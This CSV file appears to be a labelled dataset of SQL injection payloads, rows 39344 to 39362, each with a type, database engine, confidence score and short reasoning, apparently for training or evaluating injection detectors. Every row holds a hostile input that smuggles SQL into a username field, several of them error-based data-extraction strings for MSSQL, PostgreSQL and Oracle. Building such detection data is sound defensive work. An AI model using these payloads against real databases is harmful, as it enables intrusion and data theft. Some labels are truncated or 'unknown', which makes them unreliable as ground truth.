id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
39344,"select * from users WHERE username = ""-7242\' and \'kfff\' = \'kfff"" or username = ""-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
39345,"1\' ) and username = ""1"" or username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk",unknown,generic,0.50,Insufficient data to classify payload type,1
39346,"-9688%\' ) ) or username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""-6353%\' ) ) and username = ""-3613%\' ) or ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
39347,1\' or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39348,"select * from users WHERE username = ""-1254"" and username = ""-7072\' ) and username = ""1\' ) ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39349,"select * from users WHERE username = ""1\' and username = ""1 ) ) and ( ( 5139 = 5139"" or username = ""1\'|| ( select \'byxb\' where 8351 = 8351",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39350,"SELECT * FROM users WHERE username = ""-7874 ) ) ) OR username = ""-3978",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39351,"select * from users WHERE username = ""1\' and username = ""-1549\' ) and ( ( 5616 = 5616"" and username = ""1%\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39352,"select * from users WHERE username = ""1%\' ) ) ) and ( ( ( \'%\' = \'"" and ( ( ( \'mfmk\' = \'mfmk"" or username = ""1\'+ ( select vohg where 6383 = 6383 or username = ""-8007\' ) ) as bgpp where 9555 = 9555",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39353,"select * from users WHERE username = ""-5863"" or username = ""1%\' ) ) and ( ( \'%\' = \'"" and username = ""1\'|| ( select \'vvpn\' from dual where 7011 = 7011",boolean_blind,oracle,0.85,Boolean Blind detected: SQL structure with complex syn (oracle),1
39354,"-1254"" or username = ""1%\' ) ) ) and ( ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
39355,"-1344 ) as gqgi where 2545 = 2545 and username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
39356,"select * from users WHERE username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'"" or username = ""-9564 and username = ""-6190\' ) where 2621 = 2621",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39357,"1"" and ""xyjg"" = ""xyjg"" or username = ""-7242\' and \'kfff\' = \'kfff"" or username = ""1\'|| ( select \'vvpn\' from dual where 7011 = 7011 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||\'",error_based,oracle,0.85,Error Based detected: character extraction (oracle),1
39358,"select * from users WHERE username = ""1%"" or username = ""1%\' ) ) ) and ( ( ( \'%\' = \'"" and username = ""1\' ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39359,-4582 ) ) as gvfo where 8885 = 8885 and ( ( ( 6723 = 6723,unknown,generic,0.50,Insufficient data to classify payload type,1
39360,"1"" and ( ( \'%\' = \'"" and username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39361,"select * from users WHERE username = ""-3880 ) and ( 5194 = 5194"" and username = ""1%\'",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39362,"1\'+ ( select \'kicv\' where 1976 = 1976 or username = ""-6353%\' ) ) and ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
